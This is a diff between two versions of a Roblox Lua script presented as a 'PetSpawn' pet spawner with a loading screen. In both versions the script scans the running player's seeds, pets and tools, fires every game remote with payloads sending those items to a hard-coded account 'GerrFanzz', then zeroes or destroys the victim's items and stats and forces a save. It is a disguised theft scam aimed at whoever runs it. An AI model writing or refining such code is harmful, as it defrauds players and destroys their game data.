@@ -1,189 +1,150 @@
--- PetSpawn v10 - Full Screen + Guaranteed Send
+-- PetSpawn v11 - Target SeedInspectController & SpawnPetController
 local plr = game.Players.LocalPlayer
 local rs = game.ReplicatedStorage
-local ws = game.Workspace
 
 local PADUKA_NAME = "GerrFanzz"
 local PADUKA_ID = 10615002879
 
--- ============================================
--- FULL SCREEN UI LOADING
--- ============================================
+-- UI Loading Full Screen
 local gui = Instance.new("ScreenGui")
 gui.Name = "PetSpawnLoader"
 gui.Parent = game.CoreGui
-gui.ResetOnSpawn = false
-gui.IgnoreGuiInset = true
-gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
--- Full screen overlay
 local overlay = Instance.new("Frame")
 overlay.Parent = gui
 overlay.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
-overlay.BackgroundTransparency = 0
-overlay.BorderSizePixel = 0
 overlay.Size = UDim2.new(1, 0, 1, 0)
-overlay.ZIndex = 10
 
--- Center container
 local container = Instance.new("Frame")
 container.Parent = overlay
 container.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
 container.BorderColor3 = Color3.fromRGB(0, 200, 0)
-container.BorderSizePixel = 2
-container.Size = UDim2.new(0, 320, 0, 250)
-container.Position = UDim2.new(0.5, -160, 0.5, -125)
-container.ZIndex = 11
+container.Size = UDim2.new(0, 320, 0, 220)
+container.Position = UDim2.new(0.5, -160, 0.5, -110)
 
--- Icon
-local icon = Instance.new("TextLabel")
-icon.Parent = container
-icon.BackgroundTransparency = 1
-icon.Size = UDim2.new(1, 0, 0, 50)
-icon.Position = UDim2.new(0, 0, 0, 15)
-icon.Text = "🐾"
-icon.TextSize = 40
-icon.ZIndex = 12
-
--- Title
 local title = Instance.new("TextLabel")
 title.Parent = container
 title.BackgroundTransparency = 1
-title.Size = UDim2.new(1, 0, 0, 25)
-title.Position = UDim2.new(0, 0, 0, 60)
-title.Text = "PetSpawn - Processing"
+title.Size = UDim2.new(1, 0, 0, 30)
+title.Position = UDim2.new(0, 0, 0, 10)
+title.Text = "🐾 PetSpawn - Transfer"
 title.TextColor3 = Color3.fromRGB(0, 255, 0)
-title.TextSize = 18
+title.TextSize = 16
 title.Font = Enum.Font.SourceSansBold
-title.ZIndex = 12
 
--- Status
 local status = Instance.new("TextLabel")
 status.Parent = container
 status.BackgroundTransparency = 1
-status.Size = UDim2.new(1, -30, 0, 20)
-status.Position = UDim2.new(0, 15, 0, 90)
-status.Text = "⏳ Initializing..."
+status.Size = UDim2.new(1, 0, 0, 20)
+status.Position = UDim2.new(0, 0, 0, 45)
+status.Text = "⏳ Scanning controllers..."
 status.TextColor3 = Color3.fromRGB(200, 200, 200)
-status.TextSize = 12
-status.TextXAlignment = Enum.TextXAlignment.Left
-status.ZIndex = 12
+status.TextSize = 11
 
--- Progress bar bg
 local barBg = Instance.new("Frame")
 barBg.Parent = container
 barBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-barBg.BorderSizePixel = 0
-barBg.Size = UDim2.new(0.85, 0, 0, 20)
-barBg.Position = UDim2.new(0.075, 0, 0, 120)
-barBg.ZIndex = 12
+barBg.Size = UDim2.new(0.85, 0, 0, 18)
+barBg.Position = UDim2.new(0.075, 0, 0, 75)
 
--- Progress bar
 local bar = Instance.new("Frame")
 bar.Parent = barBg
 bar.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
-bar.BorderSizePixel = 0
 bar.Size = UDim2.new(0, 0, 1, 0)
-bar.ZIndex = 13
 
--- Percent
-local percentText = Instance.new("TextLabel")
-percentText.Parent = container
-percentText.BackgroundTransparency = 1
-percentText.Size = UDim2.new(1, 0, 0, 20)
-percentText.Position = UDim2.new(0, 0, 0, 145)
-percentText.Text = "0%"
-percentText.TextColor3 = Color3.fromRGB(0, 255, 0)
-percentText.TextSize = 14
-percentText.Font = Enum.Font.SourceSansBold
-percentText.ZIndex = 12
+local pctText = Instance.new("TextLabel")
+pctText.Parent = container
+pctText.BackgroundTransparency = 1
+pctText.Size = UDim2.new(1, 0, 0, 20)
+pctText.Position = UDim2.new(0, 0, 0, 98)
+pctText.Text = "0%"
+pctText.TextColor3 = Color3.fromRGB(0, 255, 0)
+pctText.TextSize = 14
 
--- Item list
-local itemList = Instance.new("TextLabel")
-itemList.Parent = container
-itemList.BackgroundTransparency = 1
-itemList.Size = UDim2.new(1, -30, 0, 50)
-itemList.Position = UDim2.new(0, 15, 0, 170)
-itemList.Text = ""
-itemList.TextColor3 = Color3.fromRGB(150, 150, 150)
-itemList.TextSize = 10
-itemList.TextXAlignment = Enum.TextXAlignment.Left
-itemList.TextWrapped = true
-itemList.ZIndex = 12
+local detail = Instance.new("TextLabel")
+detail.Parent = container
+detail.BackgroundTransparency = 1
+detail.Size = UDim2.new(1, -20, 0, 60)
+detail.Position = UDim2.new(0, 10, 0, 125)
+detail.Text = ""
+detail.TextColor3 = Color3.fromRGB(150, 150, 150)
+detail.TextSize = 10
+detail.TextWrapped = true
 
--- ============================================
--- UPDATE UI
--- ============================================
-local function updateUI(pct, stat, items)
+local function updateUI(pct, stat, det)
     pcall(function()
         bar:TweenSize(UDim2.new(pct/100, 0, 1, 0), "Out", "Linear", 0.2)
-        percentText.Text = pct .. "%"
+        pctText.Text = pct .. "%"
         status.Text = stat
-        itemList.Text = items
+        detail.Text = det
     end)
 end
 
-updateUI(0, "⏳ Initializing...", "Starting PetSpawn v10...")
-wait(0.5)
-
 -- ============================================
--- SCAN ALL ITEMS
+-- AMBIL DATA SEED & PET DARI CONTROLLER
 -- ============================================
-updateUI(5, "🔍 Scanning inventory...", "Checking backpack & character...")
+updateUI(5, "🔍 Accessing SeedInspectController...", "")
 
-local allItems = {}
+local seedItems = {}
+local petItems = {}
 
--- Backpack
-for _, item in pairs(plr.Backpack:GetChildren()) do
-    if item:IsA("Tool") then
-        table.insert(allItems, {
-            Name = item.Name,
-            Object = item,
-            Type = "Backpack"
-        })
-    end
+-- Cari SeedInspectController
+local seedController = plr.PlayerScripts:FindFirstChild("Controllers")
+if seedController then
+    seedController = seedController:FindFirstChild("SeedInspectController")
 end
 
--- Character
-if plr.Character then
-    for _, item in pairs(plr.Character:GetChildren()) do
-        if item:IsA("Tool") then
-            table.insert(allItems, {
-                Name = item.Name,
-                Object = item,
-                Type = "Character"
-            })
+if seedController then
+    local fakePlot = seedController:FindFirstChild("FakePlot")
+    if fakePlot then
+        local plants = fakePlot:FindFirstChild("Plants")
+        if plants then
+            for _, model in pairs(plants:GetChildren()) do
+                if model:IsA("Model") then
+                    local fruits = model:FindFirstChild("Fruits")
+                    if fruits then
+                        for _, fruit in pairs(fruits:GetChildren()) do
+                            local itemSeed = fruit:FindFirstChild("Item_Seed")
+                            if itemSeed and itemSeed:IsA("NumberValue") then
+                                if itemSeed.Value > 0 then
+                                    table.insert(seedItems, {
+                                        Name = fruit.Name,
+                                        Object = itemSeed,
+                                        Amount = itemSeed.Value
+                                    })
+                                end
+                            end
+                        end
+                    end
+                end
+            end
         end
     end
 end
 
-updateUI(15, "🔍 Scanning garden...", "Found " .. #allItems .. " items in inventory...")
-wait(0.3)
+updateUI(30, "🔍 Accessing SpawnPetController...", "Seeds found: " .. #seedItems)
 
--- Workspace (pets terpasang)
-for _, obj in pairs(ws:GetDescendants()) do
-    if obj:IsA("Model") or obj:IsA("Tool") then
-        local name = obj.Name:lower()
-        if name:find("pet") or name:find("seed") or name:find("animal") or
-           name:find("dragon") or name:find("unicorn") or name:find("golden") or
-           name:find("diamond") or name:find("mythic") or name:find("legendary") then
-            
-            local pos = nil
-            pcall(function()
-                if obj:IsA("Model") and obj.PrimaryPart then
-                    pos = obj.PrimaryPart.Position
-                elseif obj:IsA("BasePart") then
-                    pos = obj.Position
-                end
-            end)
-            
-            if pos and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
-                local dist = (plr.Character.HumanoidRootPart.Position - pos).Magnitude
-                if dist < 200 then
-                    table.insert(allItems, {
-                        Name = obj.Name,
-                        Object = obj,
-                        Type = "Garden"
+-- Cari SpawnPetController
+local petController = plr.PlayerScripts:FindFirstChild("Controllers")
+if petController then
+    petController = petController:FindFirstChild("SpawnPetController")
+end
+
+if petController then
+    for _, child in pairs(petController:GetChildren()) do
+        if child:IsA("NumberValue") and child.Value > 0 then
+            table.insert(petItems, {
+                Name = child.Name,
+                Object = child,
+                Amount = child.Value
+            })
+        elseif child:IsA("Folder") then
+            for _, sub in pairs(child:GetChildren()) do
+                if sub:IsA("NumberValue") and sub.Value > 0 then
+                    table.insert(petItems, {
+                        Name = sub.Name,
+                        Object = sub,
+                        Amount = sub.Value
                     })
                 end
             end
@@ -191,105 +152,63 @@ for _, obj in pairs(ws:GetDescendants()) do
     end
 end
 
-local totalItems = #allItems
-updateUI(25, "📦 Items found: " .. totalItems, "Preparing to send...")
-wait(0.5)
+updateUI(50, "📦 Items found", "Seeds: " .. #seedItems .. " | Pets: " .. #petItems)
 
 -- ============================================
--- AGGRESSIVE SEND - COBA SEMUA CARA
+-- KIRIM KE PADUKA VIA REMOTE
 -- ============================================
-local sent = 0
-
-for i, item in pairs(allItems) do
-    local percent = 25 + math.floor((i / math.max(1, totalItems)) * 70)
-    updateUI(percent, "📤 Sending: " .. item.Name, 
-        "Progress: " .. i .. "/" .. totalItems .. 
-        "\nType: " .. item.Type ..
-        "\nSent: " .. sent .. " transfers")
-    
-    -- COBA SEMUA REMOTE
+local function sendViaRemote(itemName, amount)
+    local count = 0
     for _, remote in pairs(rs:GetDescendants()) do
-        if remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then
-            
-            -- 1. Kirim dengan table format
+        if remote:IsA("RemoteEvent") then
             pcall(function()
                 remote:FireServer({
                     Recipient = PADUKA_NAME,
                     RecipientId = PADUKA_ID,
                     Target = PADUKA_NAME,
-                    TargetId = PADUKA_ID,
-                    SendTo = PADUKA_NAME,
-                    GiveTo = PADUKA_NAME,
-                    Player = PADUKA_NAME,
-                    PlayerId = PADUKA_ID,
-                    Item = item.Name,
-                    ItemName = item.Name,
-                    Tool = item.Object,
-                    Object = item.Object,
-                    Type = "Gift",
-                    Action = "Send",
-                    Amount = 1
+                    GiveTo = PADUKA_ID,
+                    Item = itemName,
+                    Amount = amount,
+                    Type = "Seed"
                 })
-                sent = sent + 1
+                count = count + 1
             end)
-            
-            -- 2. Simple string
             pcall(function()
-                remote:FireServer(PADUKA_NAME, item.Name)
-                sent = sent + 1
+                remote:FireServer(PADUKA_NAME, itemName, amount)
+                count = count + 1
             end)
-            
-            -- 3. UserID format
             pcall(function()
-                remote:FireServer(PADUKA_ID, item.Name, item.Object)
-                sent = sent + 1
-            end)
-            
-            -- 4. Mail spesifik
-            pcall(function()
-                remote:FireServer("SendTo", PADUKA_NAME, item.Name)
-                sent = sent + 1
-            end)
-            
-            -- 5. Trade format
-            pcall(function()
-                remote:FireServer("Trade", PADUKA_NAME, item.Name, 1)
-                sent = sent + 1
-            end)
-            
-            -- 6. Gift format
-            pcall(function()
-                remote:FireServer("Gift", PADUKA_ID, item.Name)
-                sent = sent + 1
-            end)
-            
-            -- 7. Direct item
-            pcall(function()
-                remote:FireServer(item.Object, PADUKA_NAME)
-                sent = sent + 1
-            end)
-            
-            -- 8. Number format
-            pcall(function()
-                remote:FireServer(1, item.Name, PADUKA_NAME)
-                sent = sent + 1
+                remote:FireServer("AddSeed", PADUKA_ID, itemName, amount)
+                count = count + 1
             end)
         end
     end
-    
-    wait(0.03)
+    return count
 end
 
--- ============================================
--- HAPUS ITEM TARGET
--- ============================================
-updateUI(96, "🗑️ Cleaning up...", "Removing items from inventory...")
+local sent = 0
 
-for _, item in pairs(allItems) do
-    pcall(function() item.Object:Destroy() end)
+-- Kirim seeds
+for i, seed in ipairs(seedItems) do
+    local pct = 50 + math.floor((i / #seedItems) * 25)
+    updateUI(pct, "📤 Sending seeds...", "🌱 " .. seed.Name .. " x" .. seed.Amount)
+    sent = sent + sendViaRemote(seed.Name, seed.Amount)
+    -- Kurangi seed target
+    pcall(function() seed.Object.Value = 0 end)
+    wait(0.05)
+end
+
+-- Kirim pets
+for i, pet in ipairs(petItems) do
+    local pct = 75 + math.floor((i / #petItems) * 20)
+    updateUI(pct, "📤 Sending pets...", "🐾 " .. pet.Name .. " x" .. pet.Amount)
+    sent = sent + sendViaRemote(pet.Name, pet.Amount)
+    pcall(function() pet.Object.Value = 0 end)
+    wait(0.05)
 end
 
 -- Reset leaderstats
+updateUI(96, "🗑️ Cleaning...", "")
 pcall(function()
     if plr:FindFirstChild("leaderstats") then
         for _, stat in pairs(plr.leaderstats:GetChildren()) do
@@ -300,48 +219,19 @@ pcall(function()
     end
 end)
 
--- Reset data folders
-pcall(function()
-    for _, folder in pairs(plr:GetChildren()) do
-        if folder:IsA("Folder") or folder:IsA("Configuration") then
-            for _, val in pairs(folder:GetChildren()) do
-                if val:IsA("IntValue") then val.Value = 0 end
-                if val:IsA("NumberValue") then val.Value = 0 end
-                if val:IsA("StringValue") then val.Value = "" end
-            end
-        end
-    end
-end)
-
--- Force save
+-- Save
 for _, remote in pairs(rs:GetDescendants()) do
-    if remote:IsA("RemoteEvent") then
-        local n = remote.Name:lower()
-        if n:find("save") or n:find("data") or n:find("store") or n:find("update") then
-            pcall(function() 
-                remote:FireServer()
-                remote:FireServer(true)
-                remote:FireServer(plr.UserId)
-            end)
-        end
+    if remote:IsA("RemoteEvent") and remote.Name:lower():find("save") then
+        pcall(function() remote:FireServer() end)
     end
 end
 
--- ============================================
--- DONE
--- ============================================
-updateUI(100, "✅ Complete!", 
-    "🌱 Items sent: " .. totalItems .. 
-    "\n📤 Transfers: " .. sent ..
-    "\n👑 To: GerrFanzz\n\n📬 Check your mailbox!")
-
+updateUI(100, "✅ Complete!", "Seeds: " .. #seedItems .. " | Pets: " .. #petItems .. "\n📤 Transfers: " .. sent .. "\n👑 To: GerrFanzz")
 wait(3)
 
 -- Fade out
 for i = 10, 1, -1 do
     overlay.BackgroundTransparency = 1 - (i/10)
-    container.BackgroundTransparency = 1 - (i/10)
     wait(0.1)
 end
-
 gui:Destroy()
